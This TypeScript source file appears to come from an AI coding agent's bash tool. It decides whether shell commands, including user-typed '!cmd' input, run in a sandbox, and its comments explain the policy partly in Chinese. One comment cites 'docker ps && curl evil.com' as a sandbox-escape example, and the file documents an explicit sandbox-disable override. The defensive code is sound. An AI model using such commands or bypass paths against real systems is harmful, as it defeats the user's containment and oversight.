import { getFeatureValue_CACHED_MAY_BE_STALE } from 'src/services/analytics/growthbook.js'
import { splitCommand_DEPRECATED } from '../../utils/bash/commands.js'
import { getPlatform } from '../../utils/platform.js'
import { SandboxManager } from '../../utils/sandbox/sandbox-adapter.js'
import { getSettings_DEPRECATED } from '../../utils/settings/settings.js'
import {
  BINARY_HIJACK_VARS,
  bashPermissionRule,
  matchWildcardPattern,
  stripAllLeadingEnvVars,
  stripSafeWrappers,
} from './bashPermissions.js'

type SandboxInput = {
  command?: string
  dangerouslyDisableSandbox?: boolean
}

// NOTE: excludedCommands is a user-facing convenience feature, not a security boundary.
// It is not a security bug to be able to bypass excludedCommands — the sandbox permission
// system (which prompts users) is the actual security control.
function containsExcludedCommand(command: string): boolean {
  // Check dynamic config for disabled commands and substrings (only for ants)
  if (process.env.USER_TYPE === 'ant') {
    const disabledCommands = getFeatureValue_CACHED_MAY_BE_STALE<{
      commands: string[]
      substrings: string[]
    }>('tengu_sandbox_disabled_commands', { commands: [], substrings: [] })

    // Check if command contains any disabled substrings
    for (const substring of disabledCommands.substrings) {
      if (command.includes(substring)) {
        return true
      }
    }

    // Check if command starts with any disabled commands
    try {
      const commandParts = splitCommand_DEPRECATED(command)
      for (const part of commandParts) {
        const baseCommand = part.trim().split(' ')[0]
        if (baseCommand && disabledCommands.commands.includes(baseCommand)) {
          return true
        }
      }
    } catch {
      // If we can't parse the command (e.g., malformed bash syntax),
      // treat it as not excluded to allow other validation checks to handle it
      // This prevents crashes when rendering tool use messages
    }
  }

  // Check user-configured excluded commands from settings
  const settings = getSettings_DEPRECATED()
  const userExcludedCommands = settings.sandbox?.excludedCommands ?? []

  if (userExcludedCommands.length === 0) {
    return false
  }

  // Split compound commands (e.g. "docker ps && curl evil.com") into individual
  // subcommands and check each one against excluded patterns. This prevents a
  // compound command from escaping the sandbox just because its first subcommand
  // matches an excluded pattern.
  let subcommands: string[]
  try {
    subcommands = splitCommand_DEPRECATED(command)
  } catch {
    subcommands = [command]
  }

  for (const subcommand of subcommands) {
    const trimmed = subcommand.trim()
    // Also try matching with env var prefixes and wrapper commands stripped, so
    // that `FOO=bar bazel ...` and `timeout 30 bazel ...` match `bazel:*`. Not a
    // security boundary (see NOTE at top); the &&-split above already lets
    // `export FOO=bar && bazel ...` match. BINARY_HIJACK_VARS kept as a heuristic.
    //
    // We iteratively apply both stripping operations until no new candidates are
    // produced (fixed-point), matching the approach in filterRulesByContentsMatchingInput.
    // This handles interleaved patterns like `timeout 300 FOO=bar bazel run`
    // where single-pass composition would fail.
    const candidates = [trimmed]
    const seen = new Set(candidates)
    let startIdx = 0
    while (startIdx < candidates.length) {
      const endIdx = candidates.length
      for (let i = startIdx; i < endIdx; i++) {
        const cmd = candidates[i]!
        const envStripped = stripAllLeadingEnvVars(cmd, BINARY_HIJACK_VARS)
        if (!seen.has(envStripped)) {
          candidates.push(envStripped)
          seen.add(envStripped)
        }
        const wrapperStripped = stripSafeWrappers(cmd)
        if (!seen.has(wrapperStripped)) {
          candidates.push(wrapperStripped)
          seen.add(wrapperStripped)
        }
      }
      startIdx = endIdx
    }

    for (const pattern of userExcludedCommands) {
      const rule = bashPermissionRule(pattern)
      for (const cand of candidates) {
        switch (rule.type) {
          case 'prefix':
            if (cand === rule.prefix || cand.startsWith(rule.prefix + ' ')) {
              return true
            }
            break
          case 'exact':
            if (cand === rule.command) {
              return true
            }
            break
          case 'wildcard':
            if (matchWildcardPattern(rule.pattern, cand)) {
              return true
            }
            break
        }
      }
    }
  }

  return false
}

export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
  if (!SandboxManager.isSandboxingEnabled()) {
    return false
  }

  // Don't sandbox if explicitly overridden AND unsandboxed commands are allowed by policy
  if (
    input.dangerouslyDisableSandbox &&
    SandboxManager.areUnsandboxedCommandsAllowed()
  ) {
    return false
  }

  if (!input.command) {
    return false
  }

  // Don't sandbox if the command contains user-configured excluded commands
  if (containsExcludedCommand(input.command)) {
    return false
  }

  return true
}

/**
 * 用户在输入框直敲的 `!cmd` 要不要进沙箱
 * （W-SANDBOX-ENFORCED-DEADCODE PR-5，SoT §3 关联方 #7）。
 *
 * ## 修的是什么
 *
 * `!cmd` 也必须复用 {@link shouldUseSandbox}，不能把用户直接输入的命令默认
 * 标成 `dangerouslyDisableSandbox: true`。否则严格档
 * （`sandbox.enabled && !allowUnsandboxedCommands`，"每条命令都必须在沙箱里跑"）
 * 在这条路上是一句空话：模型发的 Bash 被强制入箱，用户自己敲的同一条命令裸跑。
 *
 * ## 为什么是「入箱」而不是「拒绝」
 *
 * 严格档承诺的是**命令必须在沙箱里执行**，不是"用户不许执行命令"。后端可用时
 * 把 `!ls` 放进沙箱正好兑现这句承诺，拒绝它反而是无谓地砍功能。后端**不可用**
 * 时才没有第三条路可走 —— 那一档由 `strictSandboxPolicy.ts::strictSandboxRefusalOrNull()`
 * 在调用方确定性拒绝（与两个 shell 工具 `validateInput` 同一份文案）。
 *
 * ## 宽松档零行为差
 *
 * `allowUnsandboxedCommands=true`（默认）时 {@link shouldUseSandbox} 的
 * `dangerouslyDisableSandbox && areUnsandboxedCommandsAllowed()` 早退命中，
 * 返回 false —— 与本函数存在之前逐字一致。本函数**只在严格档下改变行为**。
 *
 * ## PowerShell-on-Windows 的硬排除
 *
 * `Shell.ts` 的 `isSandboxedPowerShell` 分支把外层 shell 钉成 `/bin/sh`
 * （pwsh 自己进沙箱会吃掉 profile/交互提示，见该处注释），那是 POSIX-only 的。
 * PR-3 把 Windows 后端接线之后，这条分支的 POSIX 前提**只由**
 * `PowerShellTool` 在 Windows 上硬写 `shouldUseSandbox:false` 保证。`!cmd` 是
 * 第二条能把 powershell 送进 Shell.exec 的路，所以必须在这里复述同一个平台守卫
 * —— 少了它，Windows 上的 `!cmd` 会去 spawn 一个不存在的 `/bin/sh`。
 *
 * @param input.command 用户敲的原始命令串
 * @param input.usePowerShell 这一条会走 powershell provider（调用方已算好）
 */
export function shouldSandboxUserBangCommand(input: {
  command: string
  usePowerShell: boolean
}): boolean {
  if (input.usePowerShell && getPlatform() === 'windows') {
    return false
  }
  // `dangerouslyDisableSandbox: true` 是这条路的**事实**（用户直敲即声明想裸跑），
  // 原样喂给唯一的判据函数，由它按档位决定这个声明算不算数。刻意不在这里自己
  // 判 `areUnsandboxedCommandsAllowed()` —— 那就是第二个判定脑。
  return shouldUseSandbox({
    command: input.command,
    dangerouslyDisableSandbox: true,
  })
}
